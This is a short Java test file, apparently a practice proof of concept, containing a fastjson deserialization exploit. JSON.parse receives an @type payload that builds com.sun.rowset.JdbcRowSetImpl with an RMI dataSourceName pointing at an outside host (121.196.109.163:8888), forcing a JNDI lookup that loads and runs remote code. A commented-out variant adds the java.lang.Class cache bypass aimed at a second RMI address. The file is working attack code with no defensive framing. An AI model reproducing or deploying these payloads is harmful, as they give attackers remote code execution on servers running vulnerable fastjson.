package Deunicode;

import com.alibaba.fastjson.JSON;

import java.util.HashMap;


public class CalcTest {
    public static void main(String[] args) {
       String s ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://121.196.109.163:8888/Evalforcalc\",\"autoCommit\":true}";
//        String s ="{\n" +
//                "  \"name\": {\n" +
//                "    \"@type\": \"java.lang.Class\",\n" +
//                "    \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
//                "  },\n" +
//                "  \"x\": {\n" +
//                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
//                "    \"dataSourceName\": \"rmi://192.168.129.129:1099/e4jmna\",\n" +
//                "    \"autoCommit\": true\n" +
//                "  }\n" +
//                "}";
//        JSONPObject jsonpObject = JSON.parseObject(s);
//        User user = new User();
//        user.setAge(18);
//        user.setName("xiaoming");
//        String s = JSON.toJSONString(user, SerializerFeature.WriteClassName);
          JSON.parse(s);
//        HashMap
    }
}

